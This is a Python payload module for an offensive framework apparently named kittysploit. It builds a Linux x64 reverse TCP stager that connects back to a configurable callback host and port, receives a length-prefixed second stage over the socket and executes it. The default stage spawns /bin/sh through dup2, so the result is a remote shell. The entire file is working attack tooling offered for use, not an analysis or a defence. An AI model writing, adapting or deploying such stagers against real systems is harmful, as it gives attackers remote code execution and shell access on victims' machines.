#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Linux x64 reverse TCP stager — receives length-prefixed stage over the same socket."""

from kittysploit import *

from core.framework.stager_stage import (
    DEFAULT_STAGE_PATH,
    build_linux_x64_recv_stager,
    prepare_staged_exploit,
)


class Module(Payload):
    __info__ = {
        "name": "Linux x64 Reverse TCP Stager (recv stage)",
        "description": (
            "Minimal x64 stager: connect back, read 4-byte stage length + stage, execute. "
            "Framework auto-sends stage from stage_path on listener accept. "
            "Default stage: linux_x64_shell_stage (dup2 + /bin/sh)."
        ),
        "category": PayloadCategory.STAGER,
        "arch": Arch.X64,
        "platform": Platform.LINUX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(4444, "Callback port", True)
    stage_path = OptString(
        DEFAULT_STAGE_PATH,
        "Stage payload module path (shellcode bytes sent after connect)",
        False,
        advanced=True,
    )

    def generate(self):
        if self.framework:
            try:
                stage = prepare_staged_exploit(
                    self.framework,
                    "payloads/stagers/linux/x64/reverse_tcp_recv_stage",
                    str(self.stage_path or DEFAULT_STAGE_PATH),
                    lhost=str(self.lhost),
                    lport=int(self.lport or 4444),
                )
                print_info(f"Queued stage ({len(stage)} bytes) for next TCP connection")
            except Exception as exc:
                print_warning(f"Could not pre-load stage: {exc}")
        return build_linux_x64_recv_stager(str(self.lhost), int(self.lport or 4444))
